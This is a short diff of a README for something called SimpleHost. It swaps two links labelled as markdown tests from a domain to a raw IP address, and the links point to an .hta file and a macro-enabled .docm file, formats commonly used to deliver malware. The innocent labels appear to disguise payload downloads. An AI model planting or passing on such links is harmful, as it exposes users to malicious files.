@@ -1,6 +1,6 @@
 # SimpleHost
 
-[just a markdown test](https://omgitsonfire.com/Report.hta)
+[just a markdown test](https://173.233.72.96/Report.hta)
 
 
-[Second test](https://omgitsonfire.com/Status.docm)
+[Second test](https://173.233.72.96/Status.docm)
